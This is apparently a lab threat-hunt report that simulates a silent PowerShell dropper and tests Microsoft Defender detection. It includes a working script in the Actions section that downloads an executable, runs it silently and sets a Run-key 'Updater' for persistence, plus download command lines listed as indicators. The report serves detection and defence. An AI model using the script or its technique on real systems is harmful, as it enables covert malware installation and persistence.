# Threat Hunt Report: Silent PowerShell Dropper with Persistence

## 1. Executive Summary
This hunt investigated potential adversary behavior involving PowerShell one-liners used to download and silently install executables into `C:\ProgramData\`, followed by persistence creation via Windows Run keys. The objective was to validate whether this technique was present in the environment and to assess the effectiveness of Microsoft Defender detections.

**Result:** The scenario was successfully simulated in a controlled VM environment. Indicators were captured in Microsoft Defender Advanced Hunting queries, demonstrating the ability to detect this type of malicious activity.

---

## 2. Scope
- **Environment:** Windows 10 VM onboarded into Microsoft Defender for Endpoint
- **Timeframe:** Past 7 days
- **Data sources:**
  - DeviceProcessEvents
  - DeviceNetworkEvents
  - DeviceFileEvents
  - DeviceRegistryEvents

---

## 3. Hypothesis
If an adversary abused PowerShell to download and silently execute an `.exe` from the internet, we should observe:
1. PowerShell execution with suspicious command-line parameters.
2. File creation of an executable in `C:\ProgramData`.
3. Silent execution of that file with `/S` or `/quiet` flags.
4. Registry persistence written to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.

---

## 4. Actions Performed
1. **Simulation:**
```powershell
# Lab script using GitHub release URL
$uri = "https://github.com/charliecash310/silent-dropper-lab/releases/download/v1.0/7z2501-x64.exe"
$out = "C:\ProgramData\7z2408-x64.exe"

Write-Host "Testing connectivity to $uri ..."
try { $uriObj = [uri]$uri } catch { Write-Error "Invalid URI"; exit 1 }

# Test connection (HEAD)
try {
    $r = Invoke-WebRequest -Uri $uri -Method Head -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
    Write-Host "HEAD OK: $($r.StatusCode)"
} catch {
    Write-Warning "HEAD failed: $($_.Exception.Message) -- will try GET"
}

# Try download
try {
    Write-Host "Downloading via Invoke-WebRequest..."
    Invoke-WebRequest -Uri $uri -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop
    Write-Host "Downloaded to $out"
} catch {
    Write-Warning "Invoke-WebRequest failed: $($_.Exception.Message)"
    try {
        Write-Host "Trying BITS fallback..."
        Start-BitsTransfer -Source $uri -Destination $out -ErrorAction Stop
        Write-Host "BITS download completed"
    } catch {
        Write-Error "BITS failed: $($_.Exception.Message). Exiting."
        exit 1
    }
}

# Confirm file
if (-not (Test-Path $out)) { Write-Error "Download didn't produce file. Exiting."; exit 1 }

# Optional: compute SHA256 for record
try { Get-FileHash -Path $out -Algorithm SHA256 } catch {}

# Run silently (for installers that accept /S)
try {
    Start-Process -FilePath $out -ArgumentList "/S" -Wait -ErrorAction Stop
    Write-Host "Process executed (silent argument)."
} catch {
    Write-Warning "Start-Process failed (maybe not an installer): $($_.Exception.Message)"
}

# Persistence (HKCU Run key)
try {
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $out -PropertyType String -Force
    Write-Host "Created Run key -> $out"
} catch {
    Write-Warning "Failed to create Run key: $($_.Exception.Message)"
}

   ```

2. **Hunting Queries Executed:**
   - Suspicious PowerShell execution (DeviceProcessEvents)
   - Network connections initiated by PowerShell (DeviceNetworkEvents)
   - File creation in ProgramData (DeviceFileEvents)
   - Silent installer execution (DeviceProcessEvents)
   - Registry Run-key persistence (DeviceRegistryEvents)
   - Unified timeline correlation (union query)

---

## 5. Findings
- **Process Evidence:** PowerShell executed with `Invoke-WebRequest` and `/S` flags.
- **Network Evidence:** Outbound HTTP request to `<labhost>` from PowerShell.
- **File Evidence:** Creation of `7z2408-x64.exe` under `C:\ProgramData`.
- **Execution Evidence:** Silent execution of the dropped file.
- **Registry Evidence:** Run key persistence created for `Updater` pointing to the executable.

---

## 6. Indicators of Compromise (IoCs)
- **File Path:** `C:\ProgramData\7z2408-x64.exe`
- **Registry Key:** `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater`
- **Process CommandLines:**
  - `powershell.exe Invoke-WebRequest -Uri https://<labhost>/7z2408-x64.exe -OutFile C:\ProgramData\7z2408-x64.exe`
  - `C:\ProgramData\7z2408-x64.exe /S`
- **Network Indicators:**
  - Remote URL: `https://<labhost>/7z2408-x64.exe`
  - RemoteIP: `<labhost IP>`

---

## 7. Timeline of Events
| Time (UTC) | Evidence Type | Details |
|------------|---------------|---------|
| T0         | Process       | PowerShell executed with download command |
| T0+1m      | Network       | HTTP GET to `<labhost>/7z2408-x64.exe` |
| T0+2m      | File          | File created in `C:\ProgramData` |
| T0+3m      | Process       | Silent execution of downloaded EXE |
| T0+4m      | Registry      | Run key persistence created |

---

## 8. Recommendations
- **Preventive Controls:**
  - Enable Attack Surface Reduction (ASR) rules:
    - Block process creations from PS/Command Prompt
    - Block executable content from email/webmail downloads
  - Restrict write access to `C:\ProgramData\`.
  - Enable PowerShell logging (ScriptBlock and Module).
- **Detection Enhancements:**
  - Create a custom detection rule for silent installers executed from ProgramData.
  - Create an alert for Run-key persistence referencing executables.
- **Response Playbook:**
  - Isolate affected host.
  - Remove malicious file and registry entry.
  - Reset credentials if compromise suspected.
  - Conduct mailbox review for related phishing attempts.

---

## 9. Conclusion
This hunt successfully validated detection coverage for a common attacker TTP (T1059.001 – PowerShell, T1547.001 – Registry Run Keys/Startup Folder). The environment is capable of identifying these behaviors, and further improvements can be made by operationalizing the detection rules into continuous monitoring.

---

## 10. Appendices
- **Screenshots:** Attach Advanced Hunting query results here.
- **KQL Queries:** Provided in the Threat Hunt Scenario README.
- **MITRE ATT&CK Mapping:**
  - **T1059.001** – PowerShell
  - **T1105** – Ingress Tool Transfer
  - **T1547.001** – Registry Run Keys/Startup Folder
